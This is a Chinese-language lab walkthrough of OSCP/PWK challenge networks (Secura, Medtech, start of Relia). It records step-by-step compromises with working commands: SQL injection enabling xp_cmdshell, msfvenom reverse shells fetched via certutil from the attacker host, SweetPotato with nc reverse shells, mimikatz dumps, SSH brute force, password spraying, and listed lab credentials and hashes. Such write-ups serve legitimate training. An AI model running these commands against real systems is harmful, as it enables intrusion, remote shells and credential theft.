> 但是突然想到是root登录的数据库，这里是可以读取文件的
>
> ```
> select load_file("C:\\\\Windows\\system.ini");
> ```
>
> ![image-20250320184322549](./oscp_pwk.assets/image-20250320184322549.png)
>
> 是可以读取到proof的
>
> ![image-20250320184407710](./oscp_pwk.assets/image-20250320184407710.png)

我一开始在表里面翻了翻，发现creds表

![image-20250320184243967](./oscp_pwk.assets/image-20250320184243967.png)

有两个凭证：

administrator/Almost4There8.?
charlotte/Game2On4.!

尝试winrm直接登录administrator试一下

```
evil-winrm -i 192.168.177.96 -u 'administrator' -p 'Almost4There8.?'
```

成功登录，拿到proof

![image-20250320184737696](./oscp_pwk.assets/image-20250320184737696.png)

全盘搜索找到local

![image-20250320190822581](./oscp_pwk.assets/image-20250320190822581.png)

### 192.168.177.97

还有一个账号charlotte，猜测可能是去下一个靶机的“门”（这里加`--local-auth`扫不出来，最好都试试

```
crackmapexec winrm 192.168.177.95-97 -u 'charlotte' -p 'Game2On4.!'
```

![image-20250320185219833](./oscp_pwk.assets/image-20250320185219833.png)

确定可以登陆，先进行nmap扫描

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.177.97
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-20 18:54 CST
Nmap scan report for 192.168.177.97
Host is up (0.0038s latency).
Not shown: 65514 filtered ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-03-20 10:56:20Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: SECURA)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49677/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49708/tcp open  msrpc        Microsoft Windows RPC
49797/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/20%Time=67DBF459%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (86%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2016 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-20T10:58:43
|_  start_date: 2025-02-20T19:57:55

TRACEROUTE (using port 445/tcp)
HOP RTT     ADDRESS
1   2.98 ms 192.168.45.1
2   2.99 ms 192.168.45.254
3   3.48 ms 192.168.251.1
4   3.54 ms 192.168.177.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 361.90 seconds
```

使用evil-winrm登录97

```
evil-winrm -i 192.168.177.97 -u 'charlotte' -p 'Game2On4.!'
```

全盘搜索找到local

![image-20250320190906154](./oscp_pwk.assets/image-20250320190906154.png)

`whoami /priv`发现权限：SeImpersonatePrivilege

![image-20250320191041256](./oscp_pwk.assets/image-20250320191041256.png)

可以利用SweetPotato来提权（SweetPotato类似把这几个土豆结合起来

```
.\SweetPotato.exe -t * -p "nc.exe" -a "192.168.251.177 80 -e cmd.exe"
```

![image-20250320194807717](./oscp_pwk.assets/image-20250320194807717.png)

拿到proof

![image-20250320194843857](./oscp_pwk.assets/image-20250320194843857.png)

## Challenge 1 - Medtech

（这个题总体比较复杂，一环扣一环。这片文章给了我很大的帮助：https://red6380.github.io/oscp1

> 我们受托对 MEDTECH（一家新成立的物联网医疗保健初创公司）进行渗透测试。我们的目标是尽可能多地发现漏洞和错误配置，以增强其 Active Directory 的安全态势并减少攻击面。
> 组织拓扑图如下所示，公共子网网络位于 `192.168.xx.0/24` 范围内，其中第三个八位字节的 `xx` 可以在控制面板的 *IP 地址*字段中找到。
>
> ![Figure 1: Challenge Scenario](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR-LABS/imgs/challengelab1/950940473d8812f4388e53bb3b33852a-Topology2.png)

> **172.16.102.10**
>
> Challenge1 - VM 1 OS Credentials:
> 挑战 1 - VM 1 操作系统凭据：
>
> ```
> No credentials were provided for this machine
> ```
>
> **172.16.102.11**
>
> Challenge1 - VM 2 OS Credentials:
> 挑战 1 - VM 2 操作系统凭据：
>
> ```
> No credentials were provided for this machine
> ```
>
> **192.168.102.120**
>
> Challenge1 - VM 3 OS Credentials:
> 挑战 1 - VM 3 操作系统凭据：
>
> ```
> No credentials were provided for this machine
> ```
>
> **192.168.102.121**
>
> Challenge1 - VM 4 OS Credentials:
> 挑战 1 - VM 4 操作系统凭据：
>
> ```
> No credentials were provided for this machine
> ```
>
> **192.168.102.122**
>
> Challenge1 - VM 5 OS Credentials:
> 挑战 1 - VM 5 操作系统凭据：
>
> ```
> No credentials were provided for this machine
> ```
>
> **172.16.102.12**
>
> Challenge1 - VM 6 OS Credentials:
> 挑战 1 - VM 6 操作系统凭据：
>
> ```
> No credentials were provided for this machine
> ```
>
> **172.16.102.13**
>
> Challenge1 - VM 7 OS Credentials:
> 挑战1 - 虚拟机7操作系统凭据：
>
> ```
> No credentials were provided for this machine
> ```
>
> **172.16.102.14**
>
> Challenge1 - VM 8 OS Credentials:
> 挑战 1 - VM 8 操作系统凭据：
>
> ```
> No credentials were provided for this machine
> ```
>
> **172.16.102.82**
>
> Challenge1 - VM 9 OS Credentials:
> 挑战 1 - VM 9 操作系统凭据：
>
> ```
> No credentials were provided for this machine
> ```
>
> **172.16.102.83**
>
> Challenge1 - VM 10 OS Credentials:
> 挑战 1 - VM 10 操作系统凭据：
>
> ```
> No credentials were provided for this machine
> ```

172网段所有机器ping不通，不出网


```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.102.120-122
==========================================================================================================
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-22 13:48 CST
Nmap scan report for 192.168.102.120
Host is up (0.0027s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
|_http-title: PAW! (PWK Awesome Website)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/22%OT=22%CT=1%CU=37610%PV=Y%DS=4%DC=T%G=Y%TM=67DE4FA
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT     ADDRESS
1   2.16 ms 192.168.45.1
2   2.20 ms 192.168.45.254
3   2.59 ms 192.168.251.1
4   3.27 ms 192.168.102.120

==========================================================================================================
Nmap scan report for 192.168.102.121
Host is up (0.0027s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MedTech
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/22%OT=80%CT=1%CU=43455%PV=Y%DS=4%DC=T%G=Y%TM=67DE4FA
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%TS=A)OPS(O1=M
OS:54ENW8ST11%O2=M54ENW8ST11%O3=M54ENW8NNT11%O4=M54ENW8ST11%O5=M54ENW8ST11%
OS:O6=M54EST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%
OS:DF=Y%T=80%W=FFFF%O=M54ENW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF
OS:=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=
OS:%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=
OS:G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-22T05:50:28
|_  start_date: N/A

TRACEROUTE (using port 8080/tcp)
HOP RTT     ADDRESS
-   Hops 1-3 are the same as for 192.168.102.120
4   3.12 ms 192.168.102.121

==========================================================================================================
Nmap scan report for 192.168.102.122
Host is up (0.0027s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
1194/tcp open  openvpn?
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/22%OT=22%CT=1%CU=33636%PV=Y%DS=4%DC=T%G=Y%TM=67DE4FA
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT     ADDRESS
-   Hops 1-3 are the same as for 192.168.102.120
4   3.03 ms 192.168.102.122

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 96.40 seconds
```



### 192.168.102.121(入口)

80端口开放了有应用的http服务，有一个后台页面，弱口令登录失败，但是存在sql注入，闭合为`'`

![image-20250322144644244](./oscp_pwk.assets/image-20250322144644244.png)

（开始一直用的mysql的函数，突然反应过来是mssql

执行sql语句如果不报错，就代表是True

![image-20250322153252904](./oscp_pwk.assets/image-20250322153252904.png)

```
# 开启xp_cmdshell
admin' UNION SELECT 1,2; EXEC sp_configure 'show advanced options', 1--+
admin' UNION SELECT 1,2; RECONFIGURE--+
admin' UNION SELECT 1,2; EXEC sp_configure 'xp_cmdshell', 1--+
admin' UNION SELECT 1,2; RECONFIGURE--+

# 执行命令（这里无回显
'; exec master..xp_cmdshell 'whoami' --+
```

生成反弹shell exe

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.175 LPORT=80 -f exe > revshell.exe
```

传输到靶机

```
'; exec master..xp_cmdshell 'certutil -split -urlcache -f http://192.168.45.175/revshell.exe C:\\Windows\\Temp\\revshell.exe' --+
```

![image-20250322154110719](./oscp_pwk.assets/image-20250322154110719.png)

执行exe，监听本机80端口

```
'; exec master..xp_cmdshell 'C:\\Windows\\Temp\\revshell.exe' --+
```

![image-20250322154218966](./oscp_pwk.assets/image-20250322154218966.png)

信息收集发现SeImpersonatePrivilege，土豆秒了

![image-20250322154627410](./oscp_pwk.assets/image-20250322154627410.png)

上传nc和SweetPotato

```
certutil -split -urlcache -f http://192.168.45.175/nc.exe C:\\Users\\Public\\nc.exe
certutil -split -urlcache -f http://192.168.45.175/potato/SweetPotato.exe C:\\Users\\Public\\SweetPotato.exe
```

![image-20250322154928611](./oscp_pwk.assets/image-20250322154928611.png)

启动SweetPotato提权

```
.\SweetPotato.exe -t * -p "nc.exe" -a "192.168.251.102 80 -e cmd.exe"
```

![image-20250322154950096](./oscp_pwk.assets/image-20250322154950096.png)

监听80端口拿到system shell，拿到proof

![image-20250322155048065](./oscp_pwk.assets/image-20250322155048065.png)

上传iox搭建隧道

```
certutil -split -urlcache -f http://192.168.45.175/iox/iox.exe C:\\Users\\Public\\iox.exe
kali运行
/root/tools/iox/iox proxy -l 90 -l 1080
靶机运行
Start-Process -FilePath ".\iox.exe" -ArgumentList "proxy -r 192.168.45.175:90" -NoNewWindow
```

![image-20250322155422621](./oscp_pwk.assets/image-20250322155422621.png)

成功建立隧道，上传mimikatz转存hash

```
certutil -split -urlcache -f http://192.168.45.175:90/mimikatz/x64/mimikatz.exe C:\\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

![image-20250322181910713](./oscp_pwk.assets/image-20250322181910713.png)

其中有joe用户的明文密码：Flowers1

`net user/domain`查看域内用户

![image-20250322183740851](./oscp_pwk.assets/image-20250322183740851.png)

往172段密码喷洒，有明文密码，我先尝试了这个用户

```
proxychains4 crackmapexec smb 172.16.102.10-14 -u 'joe' -p 'Flowers1'
```

![image-20250322185604286](./oscp_pwk.assets/image-20250322185604286.png)

smb账户全能登录，有一个winrm是可以登录的，IP为：172.16.102.11

![image-20250322191036722](./oscp_pwk.assets/image-20250322191036722.png)

### 192.168.102.122(VPN)

开放了22ssh和1194openvpn的服务，openvpn版本没搜到啥漏洞，尝试对22进行爆破

通过121执行`net user`猜测可能有offsec用户，针对该用户尝试爆破密码

```
hydra -l offsec -P ~/rockyou.txt ssh://192.168.102.122
```

![image-20250322162215742](./oscp_pwk.assets/image-20250322162215742.png)

成功，密码为password，使用该凭证登录ssh，拿到local

![image-20250322162306184](./oscp_pwk.assets/image-20250322162306184.png)

`sudo -l`发现可以执行openvpn命令（其他命令sudo执行会发现没权限

![image-20250322162358568](./oscp_pwk.assets/image-20250322162358568.png)

通过openvpn sudo提权，拿到proof

```
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
```

![image-20250322163030871](./oscp_pwk.assets/image-20250322163030871.png)

在mario用户家目录发现ssh私钥文件

![image-20250322163536234](./oscp_pwk.assets/image-20250322163536234.png)

mario用户目前没用的，可以把私钥拿下来备用

| IP          | Ports                       |
| :---------- | :-------------------------- |
| 172.16.x.10 | 53、88、135、139、445、5985 |
| 172.16.x.11 | 135、445、5985              |
| 172.16.x.12 | 139、445、3389、5985        |
| 172.16.x.13 | 135、445、5985              |
| 172.16.x.14 | 22                          |
| 172.16.x.82 | 135、445、3389              |
| 172.16.x.83 | 135、445、5985              |

### 172.16.102.14

该服务器只开了22端口，可以尝试用VPN机器找到的私钥登录试试（需要给私钥`chmod 700 id_rsa`权限

```
ssh mario@172.16.102.12 -i id_rsa
```

![image-20250323182447707](./oscp_pwk.assets/image-20250323182447707.png)

成功登录，拿到local

![image-20250323182822609](./oscp_pwk.assets/image-20250323182822609.png)

上传linpeas.sh和pspy32s

无法提权

### 172.16.102.11

我可以利用mimikatz抓到的明文密码登录这台机器

```
proxychains4 evil-winrm -i 172.16.102.11 -u 'joe' -p 'Flowers1' 
```

![image-20250322191556244](./oscp_pwk.assets/image-20250322191556244.png)

拿到local

![image-20250322191624462](./oscp_pwk.assets/image-20250322191624462.png)

查看用户权限发现都启用了

![image-20250322192116545](./oscp_pwk.assets/image-20250322192116545.png)

那我们直接去cat proof就行

![image-20250322192235924](./oscp_pwk.assets/image-20250322192235924.png)

在刚刚登录winrm还有一个文件：fileMonitorBackup.log，在文件各处隐藏了一些NTLM hash，可以提取出来，利用https://hashes.com/en/decrypt/hash  解密

只有一个没解出来

```
daisy
abf36048c1cf88f5603381c5128feb8e
toad
5be63a865b65349851c1f11a067a3068:toadstoolpassword
wario
fdf36048c1cf88f5630381c5e38feb8e:Mushroom!
goomba
8e9e1516818ce4e54247e71e71b5f436:squishhop
```

使用已解密的明文密码对82-83主机进行winrm尝试（10-14无论是域还是本地认证都失败了

```
proxychains4 crackmapexec winrm 172.16.102.82-83 -u 'wario' -p 'Mushroom!' 
```

![image-20250322195434806](./oscp_pwk.assets/image-20250322195434806.png)

该凭证可以登录172.16.102.83，wario/Mushroom!

### 172.16.102.83

使用winrm连接

```
proxychains4 evil-winrm -i 172.16.102.83 -u 'wario' -p 'Mushroom!' 
```

成功连接，拿到local

![image-20250322195752492](./oscp_pwk.assets/image-20250322195752492.png)

上传winPEASany.exe并执行

发现auditTracker.exe为开启自启，而且我们有编辑权限

![image-20250322203636205](./oscp_pwk.assets/image-20250322203636205.png)

利用msfvenom制作reshell.exe

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.175 LPORT=80 -f exe > rev.exe
```

上传

```
certutil -split -urlcache -f http://192.168.45.175/revshell.exe C:\\DevelopmentExecutables\\auditTracker.exe
```

使用sc重启进程

```
sc.exe stop auditTracker
sc.exe start auditTracker
```

![image-20250323181325238](./oscp_pwk.assets/image-20250323181325238.png)

nc监听拿到system shell，拿到proof

![image-20250323181417148](./oscp_pwk.assets/image-20250323181417148.png)

上传mimikatz转存hash

![image-20250323181929033](./oscp_pwk.assets/image-20250323181929033.png)

```
Administrator:00fd074ec24fd70c76727ee9b2d7aacd
CLIENT02:4b1e15e3714b29e73596cf402642ad62
```

### 172.16.102.82

通过内网喷洒找到可以登录82的smb的凭证：yoshi/Mushroom!

```
proxychains4 crackmapexec smb 172.16.102.82-83 -u ./dist/users.txt -p ./dist/psss.txt
```

![image-20250323192453995](./oscp_pwk.assets/image-20250323192453995.png)

显示（Pwn3d!，我记得好像是可以直接psexec RCE的

```
proxychains4 impacket-psexec 'yoshi:Mushroom!'@172.16.102.82
```

![image-20250323192657561](./oscp_pwk.assets/image-20250323192657561.png)

搜索拿到proof

![image-20250323193047692](./oscp_pwk.assets/image-20250323193047692.png)

在`C:\Users\Administrator.MEDTECH\Searches\hole.txt`找到一个凭证：leon/rabbit!:)        （实际上在12那台机器上通过mimikatz转存hash可以发现，真正的凭证没有'!'，这个凭证是有些问题的

![image-20250323193145630](./oscp_pwk.assets/image-20250323193145630.png)





### 172.16.102.12

通过喷洒发现12上有可能的凭证：yoshi:Mushroom!

![image-20250323193806112](./oscp_pwk.assets/image-20250323193806112.png)

机器开启了3389，尝试RDP登录

````
proxychains4 xfreerdp /u:'yoshi' /p:'Mushroom!' /v:172.16.102.12 +clipboard
````

![image-20250323194010309](./oscp_pwk.assets/image-20250323194010309.png)

桌面拿到local

上传winPEASany发现有一个`C:\TEMP\backup.exe`

![image-20250323200047787](./oscp_pwk.assets/image-20250323200047787.png)

猜测应该是定期备份，将反弹shellexe上传覆盖

```
certutil -split -urlcache -f http://192.168.45.175:85/reshell.exe C:\TEMP\backup.exe
```

成功反弹，拿到proof

![image-20250323200642894](./oscp_pwk.assets/image-20250323200642894.png)

最后习惯性上传mimikatz转存hash，有一个明文密码（其实这个密码我在172.16.102.82的一个文件也能拿到![image-20250323201048807](./oscp_pwk.assets/image-20250323201048807.png)

### 172.16.102.13

使用泄露凭证：leon/rabbit:)  （这里我又去看了下那台机器mimikatz输出发现多了个'!'

```
proxychains4 evil-winrm -i 172.16.102.13 -u 'leon' -p 'rabbit:)' 
```

![image-20250324133545280](./oscp_pwk.assets/image-20250324133545280.png)

成功连接，用户可以直接拿到proof

![image-20250324133712965](./oscp_pwk.assets/image-20250324133712965.png)

### 172.16.102.10

使用psexec

```
proxychains4 impacket-psexec 'leon:rabbit:)'@172.16.102.10
```

![image-20250324133346769](./oscp_pwk.assets/image-20250324133346769.png)

成功连接，权限为system，拿到proof，还有一个文件`credentials.txt`保存了web01的凭证：offsec/century62hisan51

![image-20250324134057601](./oscp_pwk.assets/image-20250324134057601.png)

### 192.168.102.120

机器只开启了22和80端口，80应该是个静态页面，通过10拿到的凭证可以ssh登陆：offsec/century62hisan51

![image-20250324134316817](./oscp_pwk.assets/image-20250324134316817.png)

没找到local，信息收集发现用户可以无密码执行sudo任何命令

![image-20250324134408858](./oscp_pwk.assets/image-20250324134408858.png)

拿到proof（这是这个靶机最后一个flag

![image-20250324134445597](./oscp_pwk.assets/image-20250324134445597.png)



## Challenge 2 - Relia

> 我们的任务是对 *Relia* 公司进行渗透测试，这是一家为木材行业制造驾驶系统的工业公司。几周前，目标公司遭到攻击，现在希望评估其 IT 安全状况。他们的目标是确定攻击者是否能够突破边界并访问内部网络中的域控制器。
> 组织拓扑图如下所示，公共子网网络位于 `192.168.xx.0/24` 范围内，其中第三个八位字节的 `xx` 可以在控制面板的 *IP 地址*字段中找到。
>
> ![Figure 1: Challenge Scenario](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR-LABS/imgs/challengelab2/01233ad451c1561bc376ad96effdf101-CL2Topo4px.png)
>
> 给了192.168.102.250的 WINPREP 操作系统凭据：offsec/lab

外网信息收集

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.102.245-249
============================================192.168.102.245===========================================================
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-24 13:51 CST
Nmap scan report for 192.168.102.245
Host is up (0.0033s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
|_http-title: RELIA Corp.
443/tcp  open  ssl/http Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
|_http-title: RELIA Corp.
| ssl-cert: Subject: commonName=web01.relia.com/organizationName=RELIA/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2022-10-12T08:55:44
|_Not valid after:  2032-10-09T08:55:44
| tls-alpn: 
|_  http/1.1
2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
|_http-title: Site doesn't have a title (text/html).

============================================192.168.102.246===========================================================
Nmap scan report for 192.168.102.246
Host is up (0.0032s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Code Validation
443/tcp  open  ssl/http Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Code Validation
| ssl-cert: Subject: commonName=demo
| Subject Alternative Name: DNS:demo
| Not valid before: 2022-10-12T07:46:27
|_Not valid after:  2032-10-09T07:46:27
| tls-alpn: 
|_  http/1.1
2222/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)

============================================192.168.102.247===========================================================
Nmap scan report for 192.168.102.247
Host is up (0.0032s latency).
Not shown: 65518 closed ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: RELIA - New Hire Information
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: RELIA - New Hire Information
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WEB02
|   NetBIOS_Domain_Name: WEB02
|   NetBIOS_Computer_Name: WEB02
|   DNS_Domain_Name: WEB02
|   DNS_Computer_Name: WEB02
|   Product_Version: 10.0.20348
|_  System_Time: 2025-03-24T05:53:09+00:00
| ssl-cert: Subject: commonName=WEB02
| Not valid before: 2025-03-23T05:47:25
|_Not valid after:  2025-09-22T05:47:25
|_ssl-date: 2025-03-24T05:53:36+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14020/tcp open  ftp           FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
